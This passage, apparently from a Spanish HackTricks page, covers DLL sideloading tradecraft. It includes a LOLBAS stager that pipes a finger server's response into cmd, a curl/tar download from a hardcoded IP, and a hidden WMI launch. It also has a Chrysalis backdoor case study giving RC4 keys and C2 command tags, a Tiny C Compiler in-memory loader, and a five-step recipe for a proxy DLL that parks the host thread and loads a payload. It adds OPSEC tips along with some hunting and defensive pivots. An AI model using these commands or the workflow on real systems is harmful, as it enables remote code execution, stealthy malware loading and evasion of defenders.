* El decryptor de ShadowPad espera que el blob TMP esté junto al loader y sea writable para poder poner a cero el archivo después del mapping. Mantén el directorio writable hasta que el payload cargue; una vez en memory, el archivo TMP puede borrarse con seguridad para OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Los operadores combinan DLL sideloading con LOLBAS para que el único artefacto custom en disco sea la malicious DLL junto al trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell lanza `cmd.exe /c`, obtiene comandos desde un Finger server y los canaliza a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` obtiene texto por TCP/79; `| cmd` ejecuta la respuesta del servidor, permitiendo a los operators rotar el second stage del lado del servidor.

- **Built-in download/extract:** Descarga un archive con una extensión benigna, lo desempaqueta y coloca el sideload target y la DLL bajo una carpeta aleatoria en `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta el progreso y sigue redirects; `tar -xf` usa el tar integrado de Windows.

- **WMI/CIM launch:** Inicia el EXE vía WMI para que la telemetría muestre un proceso creado por CIM mientras carga la DLL colocada en el mismo directorio:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona con binaries que prefieren DLL locales (por ejemplo, `intelbq.exe`, `nearby_share.exe`); el payload (por ejemplo, Remcos) se ejecuta bajo el nombre trusted.

- **Hunting:** Genera alertas sobre `forfiles` cuando `/p`, `/m` y `/c` aparecen juntos; es poco común fuera de scripts de administración.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una intrusión reciente de Lotus Blossom abusó de una trusted update chain para entregar un dropper empaquetado con NSIS que preparó un DLL sideload junto con payloads totalmente in-memory.

Tradecraft flow
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca como **HIDDEN**, deja un Bitdefender Submission Wizard renombrado `BluetoothService.exe`, un malicious `log.dll` y un encrypted blob `BluetoothService`, y luego lanza el EXE.
- El host EXE importa `log.dll` y llama a `LogInit`/`LogWrite`. `LogInit` carga el blob mediante mmap; `LogWrite` lo decrypts con un stream custom basado en LCG (constantes **0x19660D** / **0x3C6EF35F**, key material derivado de un hash previo), sobrescribe el buffer con shellcode en plaintext, libera los temporales y salta a él.
- Para evitar un IAT, el loader resuelve APIs haciendo hashing de export names usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, y luego aplica un Murmur-style avalanche (**0x85EBCA6B**) y compara contra salted target hashes.

Main shellcode (Chrysalis)
- Decrypts un PE-like main module repitiendo add/XOR/sub con la key `gQ2JR&9;` durante cinco pasadas, y luego carga dinámicamente `Kernel32.dll` → `GetProcAddress` para terminar la import resolution.
- Reconstruye cadenas de nombres DLL en runtime mediante transforms per-character de bit-rotate/XOR, y luego carga `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un segundo resolver que recorre el **PEB → InMemoryOrderModuleList**, analiza cada export table en bloques de 4 bytes con Murmur-style mixing, y solo recurre a `GetProcAddress` si el hash no se encuentra.

Embedded configuration & C2
- La config vive dentro del archivo `BluetoothService` dejado en **offset 0x30808** (size **0x980**) y se decrypts con RC4 usando la key `qwhvb^435h&*7`, revelando la URL de C2 y el User-Agent.
- Los beacons construyen un perfil del host delimitado por puntos, anteponen la etiqueta `4Q`, y luego RC4-encrypt con la key `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Las respuestas se RC4-decrypt y se envían mediante un tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- El modo de ejecución está controlado por CLI args: sin args = instala persistence (service/Run key) apuntando a `-i`; `-i` relanza a sí mismo con `-k`; `-k` omite la instalación y ejecuta el payload.

Alternate loader observed
- La misma intrusión dejó Tiny C Compiler y ejecutó `svchost.exe -nostdlib -run conf.c` desde `C:\ProgramData\USOShared\`, con `libtcc.dll` al lado. El C source proporcionado por el attacker embebía shellcode, lo compilaba y lo ejecutaba in-memory sin tocar el disk con un PE. Replica con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compile-and-run basada en TCC importó `Wininet.dll` en tiempo de ejecución y descargó un shellcode de segunda etapa desde una URL hardcoded, proporcionando un loader flexible que se hacía pasar por una compilación.

## Signed-host sideloading con export proxying + host thread parking

Algunas cadenas de DLL sideloading añaden **stability engineering** para que el host legítimo siga vivo el tiempo suficiente para cargar etapas posteriores de forma limpia en lugar de crashear después de que se cargue la DLL maliciosa.

Patrón observado
- Se deja caer un EXE confiable junto a una DLL maliciosa usando el nombre de dependencia esperado como `version.dll`.
- La DLL maliciosa **proxya cada export esperado** hacia la DLL real del sistema (por ejemplo `%SystemRoot%\\System32\\version.dll`) para que la resolución de imports siga funcionando y el proceso host continúe operativo.
- Tras la carga, la DLL maliciosa **parchea el entry point del host** para que el hilo principal caiga en un bucle infinito de `Sleep` en lugar de salir o ejecutar rutas de código que terminarían el proceso.
- Un nuevo hilo realiza el trabajo malicioso real: descifrar el nombre o la ruta de la DLL de la siguiente etapa (RC4/XOR son comunes) y luego lanzarla con `LoadLibrary`.

Por qué importa
- El DLL proxying normal preserva la compatibilidad de API, pero no garantiza que el host siga vivo el tiempo suficiente para las etapas posteriores.
- Aparcar el hilo principal en `Sleep(INFINITE)` es una forma simple de mantener el proceso firmado residente mientras el loader realiza el descifrado, el staging o el bootstrap de red en un worker thread.
- Buscar solo un `DllMain` sospechoso hace que se pase por alto este patrón si el comportamiento interesante ocurre después de que se parchea el entry point del host y arranca un hilo secundario.

Workflow mínimo
1. Copia el EXE host firmado y determina la DLL que resuelve desde el directorio local.
2. Construye una DLL proxy exportando las mismas funciones y reenviándolas a la DLL legítima.
3. En `DllMain(DLL_PROCESS_ATTACH)`, crea un worker thread.
4. Desde ese hilo, parchea el entry point del host o la rutina de inicio del hilo principal para que se quede en un bucle sobre `Sleep`.
5. Descifra el nombre/config de la DLL de la siguiente etapa y llama a `LoadLibrary` o haz manual-map del payload.

Pivotes defensivos
- Procesos firmados cargando `version.dll` o librerías comúnmente similares desde su propio directorio de aplicación en lugar de `System32`.
- Parches en memoria en el entry point del proceso poco después de la carga de la imagen, especialmente saltos/llamadas redirigidos a `Sleep`/`SleepEx`.
- Hilos creados por una DLL proxy que inmediatamente llaman a `LoadLibrary` sobre una segunda DLL con un nombre descifrado.
- DLL proxy de exportaciones completas colocadas junto a ejecutables de vendor dentro de directorios de staging escribibles como `ProgramData`, `%TEMP%` o rutas de archivos descomprimidos.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
